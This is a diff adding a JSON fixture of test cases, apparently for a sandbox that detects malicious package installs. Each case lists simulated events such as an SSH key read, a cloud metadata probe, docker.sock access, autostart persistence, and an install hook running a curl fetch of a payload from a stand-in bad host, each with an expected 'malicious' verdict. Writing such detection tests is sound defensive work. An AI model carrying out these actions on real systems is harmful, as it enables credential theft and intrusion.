@@ -1,0 +1,178 @@
+[
+  {
+    "name": "secret_scrape",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "developer_workstation",
+    "scenario": "install_build",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:00:00Z",
+        "kind": "honey_secret_access",
+        "subject": "~/.ssh/id_ed25519",
+        "detail": "fake SSH key was read",
+        "severity": "critical"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["honey_secret_access"]
+  },
+  {
+    "name": "metadata_probe",
+    "artifact": {
+      "ecosystem": "generic_web",
+      "source": "https://169.254.169.254/latest/meta-data/",
+      "requested_selector": "latest",
+      "selector_kind": "url"
+    },
+    "persona": "cloud_operator",
+    "scenario": "cli_smoke",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:01:00Z",
+        "kind": "metadata_probe",
+        "subject": "169.254.169.254",
+        "detail": "metadata service probed",
+        "severity": "high"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["metadata_probe"]
+  },
+  {
+    "name": "second_stage_downloader",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "ci_runner",
+    "scenario": "install_build",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:02:00Z",
+        "kind": "downloader",
+        "subject": "https://cdn.bad.invalid/payload",
+        "detail": "installer fetched second-stage payload",
+        "severity": "high"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["downloader"]
+  },
+  {
+    "name": "shell_spawn",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "developer_workstation",
+    "scenario": "install_build",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:03:00Z",
+        "kind": "shell_spawn",
+        "subject": "/bin/sh -c curl https://cdn.bad.invalid/payload",
+        "detail": "install hook spawned shell",
+        "severity": "high"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["shell_spawn"]
+  },
+  {
+    "name": "persistence",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "ci_runner",
+    "scenario": "delayed_rerun",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:04:00Z",
+        "kind": "persistence",
+        "subject": "~/.config/autostart/zitpit.desktop",
+        "detail": "attempted startup persistence",
+        "severity": "medium"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["persistence"]
+  },
+  {
+    "name": "container_socket_touch",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "container_build_node",
+    "scenario": "import_load",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:05:00Z",
+        "kind": "container_socket_touch",
+        "subject": "/var/run/docker.sock",
+        "detail": "attempted to access container socket",
+        "severity": "high"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["container_socket_touch"]
+  },
+  {
+    "name": "archive_staging",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "developer_workstation",
+    "scenario": "baited_vs_sterile",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:06:00Z",
+        "kind": "archive_staging",
+        "subject": "/tmp/stage/payload.tar.gz",
+        "detail": "payload staged for repackaging",
+        "severity": "medium"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["archive_staging"]
+  },
+  {
+    "name": "exfil_attempt",
+    "artifact": {
+      "ecosystem": "archive",
+      "source": "https://github.com/acme/tool/releases/download/v2.0.0/tool-linux-amd64.tar.gz",
+      "requested_selector": "v2.0.0",
+      "selector_kind": "tag"
+    },
+    "persona": "ci_runner",
+    "scenario": "warm_cache",
+    "events": [
+      {
+        "timestamp": "2026-04-01T12:07:00Z",
+        "kind": "exfil_attempt",
+        "subject": "https://sinkhole.zitpit.invalid",
+        "detail": "outbound data send attempted",
+        "severity": "critical"
+      }
+    ],
+    "expected_verdict": "malicious",
+    "expected_tripwires": ["exfil_attempt"]
+  }
+]
